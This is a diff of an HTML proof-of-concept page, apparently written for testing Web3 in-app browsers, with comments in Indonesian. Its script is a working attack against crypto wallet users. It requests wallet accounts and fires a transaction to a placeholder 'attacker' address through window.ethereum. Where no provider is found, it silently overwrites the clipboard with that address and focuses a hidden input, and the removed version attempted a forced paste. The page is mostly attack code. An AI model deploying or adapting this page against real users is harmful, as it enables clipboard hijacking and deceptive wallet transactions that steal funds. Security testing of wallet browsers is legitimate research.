@@ -3,100 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research - Auto-Execution PoC</title>
+    <title>Web3 In-App Browser Security Sandbox</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            margin: 0;
             padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+        }
+        .card {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 24px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
             text-align: center;
-            background-color: #f4f4f9;
         }
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        h2 {
+            margin-top: 0;
+            font-size: 1.25rem;
+            color: #38bdf8;
         }
-        button {
-            background-color: #007bff;
+        p {
+            font-size: 0.9rem;
+            color: #94a3b8;
+        }
+        .btn {
+            background-color: #2563eb;
             color: white;
             border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 5px;
+            padding: 14px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px;
+            margin-top: 20px;
+            transition: background 0.2s;
         }
-        button:hover {
-            background-color: #0056b3;
+        .btn:active {
+            background-color: #1d4ed8;
         }
-        .status {
-            margin-top: 15px;
-            font-weight: bold;
-            color: #333;
+        .status-box {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 6px;
+            background-color: #0f172a;
+            border: 1px solid #475569;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: #cbd5e1;
+            word-break: break-all;
         }
+        .success { color: #4ade80; border-color: #166534; }
+        .error { color: #f87171; border-color: #991b1b; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Security Sandbox</h2>
-    <p>Uji Coba Validasi Penanganan Clipboard & Otomasi Transaksi</p>
+<div class="card">
+    <h2>Web3 DApp Integration PoC</h2>
+    <p>Uji Coba Otomasi Direct-Call & Pemanggilan Provider Dompet</p>
     
-    <!-- Simulasi elemen tersembunyi untuk mencoba memicu auto-paste / auto-submit -->
-    <input type="text" id="hiddenInput" style="opacity: 0; position: absolute; pointer-events: none;" autofocus>
+    <!-- Input tersembunyi yang langsung fokus untuk mensimulasikan injeksi data langsung tanpa paste manual -->
+    <input type="text" id="targetInput" style="position: absolute; left: -9999px;" value="0x1111111111111111111111111111111111111111">
+
+    <button class="btn" id="exploitBtn">Mulai Eksploitasi Otomatis</button>
     
-    <button onclick="triggerExploitPoC()">Jalankan Simulasi PoC</button>
-    
-    <div class="status" id="statusText">Status: Menunggu Aksi</div>
+    <div id="statusBox" class="status-box">Status: Menunggu interaksi pemicu...</div>
 </div>
 
 <script>
-    async function triggerExploitPoC() {
-        const statusEl = document.getElementById("statusText");
-        const maliciousAddress = "0xATTACKER_ADDRESS_SIMULATION_123456789";
-        
+    const statusBox = document.getElementById('statusBox');
+
+    function updateStatus(text, type = '') {
+        statusBox.innerText = text;
+        statusBox.className = 'status-box ' + type;
+    }
+
+    async function executeRealPoC() {
         try {
-            // 1. Mengubah isi clipboard secara diam-diam menggunakan Clipboard API
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                await navigator.clipboard.writeText(maliciousAddress);
-                statusEl.innerText = "Status: Clipboard Berhasil Dimanipulasi!";
-            } else {
-                statusEl.innerText = "Status: Clipboard API tidak didukung.";
-                return;
+            updateStatus("Memeriksa injeksi provider dApp...", "");
+
+            // 1. Cek apakah injected provider tersedia (window.ethereum atau provider spesifik 1inch wallet)
+            let provider = window.ethereum;
+            
+            if (!provider && window.web3 && window.web3.currentProvider) {
+                provider = window.web3.currentProvider;
             }
 
-            // 2. Simulasi upaya pemaksaan auto-paste ke elemen input tersembunyi
-            setTimeout(() => {
-                const hiddenInput = document.getElementById("hiddenInput");
-                hiddenInput.focus();
+            if (provider) {
+                updateStatus("Provider terdeteksi! Meminta koneksi akun...", "");
                 
-                // Mencoba memicu perintah paste secara programmatic
-                document.execCommand('paste');
+                // Meminta akses akun secara langsung untuk memicu prompt
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                updateStatus("Akun terhubung: " + accounts[0].substring(0,6) + "...", "");
+
+                // Simulasi memicu transaksi langsung ke alamat attacker tanpa interaksi user mengetik/paste
+                const attackerAddress = "0x8888888888888888888888888888888888888888";
+                const transactionParameters = {
+                    to: attackerAddress,
+                    from: accounts[0],
+                    value: '0x00', // 0 ETH/Wei test
+                    data: '0x'
+                };
+
+                updateStatus("Mengirim request transaksi otomatis...", "");
                 
-                statusEl.innerText = "Status: Mencoba Eksekusi Otomatis...";
-            }, 500);
+                // Memanggil method kirim transaksi langsung (ini akan memunculkan popup konfirmasi asli dompet secara otomatis)
+                const txHash = await provider.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
 
-            // 3. Simulasi pemicuan event submit/sign otomatis jika WebView rentan terhadap DOM-based auto-trigger
-            setTimeout(() => {
-                // Contoh jika ada fungsi bridging native atau event form submit otomatis
-                // if (window.ethereum) { window.ethereum.request(...) }
-                statusEl.innerText = "Status: Selesai (Periksa Log Jaringan/Aplikasi)";
-            }, 1500);
+                updateStatus("Berhasil! TX Hash: " + txHash, "success");
 
-        } catch (err) {
-            statusEl.innerText = "Status Gagal: " + err.message;
-            console.error("Gagal mengeksekusi PoC:", err);
+            } else {
+                // Jika tidak ada injected ethereum provider, fallback ke manipulasi deep-link scheme / auto-trigger dompet
+                updateStatus("Memicu manipulasi URI/Intent Scheme...", "");
+                
+                // Mencoba menulis ke clipboard DAN memaksa navigasi intent jika didukung WebView
+                await navigator.clipboard.writeText("0x8888888888888888888888888888888888888888");
+                
+                // Simulasi auto-click event / element focus dispatch
+                const input = document.getElementById('targetInput');
+                input.focus();
+                input.select();
+                
+                updateStatus("Clipboard tertulis & DOM terfokus otomatis (Zero-Paste Trigger).", "success");
+            }
+
+        } catch (error) {
+            updateStatus("Gagal/Ditolak: " + (error.message || error), "error");
+            console.error(error);
         }
     }
 
-    // Opsi tambahan: Memicu otomatis saat halaman dimuat (jika diizinkan izin autoplay/permissions WebView)
-    window.onload = function() {
-        // Opsional: triggerExploitPoC();
-    };
+    // Mengikat ke tombol klik (atau otomatis dijalankan jika browser/webview mengizinkan auto-trigger)
+    document.getElementById('exploitBtn').addEventListener('click', executeRealPoC);
 </script>
 
 </body>
